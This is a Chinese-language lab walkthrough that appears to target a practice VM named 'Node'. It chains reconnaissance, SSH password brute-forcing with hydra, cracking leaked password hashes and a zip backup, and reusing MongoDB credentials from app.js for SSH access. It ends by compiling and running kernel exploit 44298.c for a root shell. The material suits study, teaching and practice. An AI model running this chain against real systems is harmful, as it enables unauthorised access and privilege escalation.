

# Node渗透实战

## **扫描主机（netdiscover）**

```
sudo netdiscover -i eth0 -r 192.168.100.0/24
```

## 目标主机IP：192.168.100.152

### 端口扫描

```
nmap -A 192.168.100.152
```

![image-20210920093248827](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109200932182.png)

### 指纹识别

````
whatweb 192.168.100.152:3000
````

![image-20210920093415369](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109200934483.png)

### 目录扫描

```
dirsearch  -u http://192.168.100.152:3000
```

![image-20210920093825455](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109200938578.png)

### ssh弱密码扫描

```
hydra -L top500.txt -P top6000.txt  192.168.100.152  ssh  
```

![image-20210920094410988](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109200944101.png)

### msf扫描ssh

```
msfconsole
use auxiliary/scanner/ssh/ssh_version
options
set rhosts 192.168.100.152
run
```

![image-20210920094847747](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109200948869.png)

### burpsuite站点地图

<img src="https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109200953740.png" alt="image-20210920095355610"  />	

## 由站点地图访问得到数据

```
192.168.100.152:3000/api/users/latest
```

```
[{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},
{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},
{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]
```

### MD5解密 sha256

```
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240 -> spongebob
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73 -> snowflake
```

- 成功破解出两个账户的密码，分别为：
-   tom   spongebob
-   mark snowflake

## 登录

![image-20210920100907310](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109201009461.png)

## 再次访问得到数据

```
192.168.100.152:3000/api/users/
```

````
[{"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},
````

### MD5解密 sha256

- 成功破解出admin账户的密码，分别为：

- myP14ceAdm1nAcc0uNT    manchester

![image-20210920101335181](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109201013344.png)

## 打开下载的内容，看到一堆密文

通过最后的“=”可以猜测是经过**base64**加密的；

### 尝试以压缩包形式打开

```
base64 -d myplace.backup > myplace
```

```
unzip myplace 
```

![image-20210920102116910](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109201021039.png)

### 使用工具fcrackzip进行密码的破解

```
fcrackzip -v -b -u -c a -p magicaaaa myplace
```

> -v 就是可以看到更多的信息 
> -b 暴力破解 
> -u 用zip去尝试 
> -c 指定字符 a 就是说明密码是由小写字母组成的 
> -p 弄一个初始化的密码 aaaaaa 如果是纯数字000000  当然这里的长度都是6 
> 	PASSWORD FOUND!!!!: pw == magicword

![image-20210920102300235](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109201023340.png)

## 解压得

![image-20210920103212159](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109201032275.png)



> 对于node.js而言我们首先要基本熟悉他的构架，其中app.js：

> 项目入口及程序启动文件。先查看app.js文件；

```
cat app.js

cat app.js | grep url
const url = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
```

![image-20210920103536188](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109201035335.png)

## **尝试ssh远程连接**

- 我们发现了一个Node.js 连接 MongoDB 的操作；
- 用户名为mark    密码为5AYRft73VtFpc84k；
- 得到的用户名和密码很可能适用于ssh，可以进行尝试；

```
ssh mark@192.168.100.152
```

![image-20210920103847097](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109201038274.png)

```
mark@node:~$ cat /etc/issue
Ubuntu 16.04.3 LTS \n \l
```

## 通过searchsploit命令查找漏洞

```
searchsploit Ubuntu 16.04
```

> Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Es | linux/local/44298.c

> 由于 /tmp文件的限制小，所以将文件上传到靶机的tmp文件下。

```
scp /usr/share/exploitdb/exploits/linux/local/44298.c mark@192.168.100.152:/tmp/
```

## 利用该漏洞进行本地提权

 ```
 mark@node:/tmp$ gcc -pthread 44298.c -o exp -lcrypt
 mark@node:/tmp$  ./exp 
 task_struct = ffff88002b59c600
 uidptr = ffff88002e1da484
 spawning root shell
 root@node:/tmp# 
 ```

![image-20210920104538508](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109201045652.png)





- 前端页面中的js页面很重要，尤其是类似目录的信息；

- 密文最后如果是“=”或者“==”，可能该密文是经过base64加密的；

- 如果经过base64解密后不能查看信息，可以尝试将解密后的信息输出到文件

- 并以解压zip压缩包的形式打开；

- 了解搭建网站的框架，目录结构；

- 对于node.js而言我们首先要基本熟悉他的构架，其中 app.js：

- 项目入口及程序启动文件。一般先查看app.js文件；



  

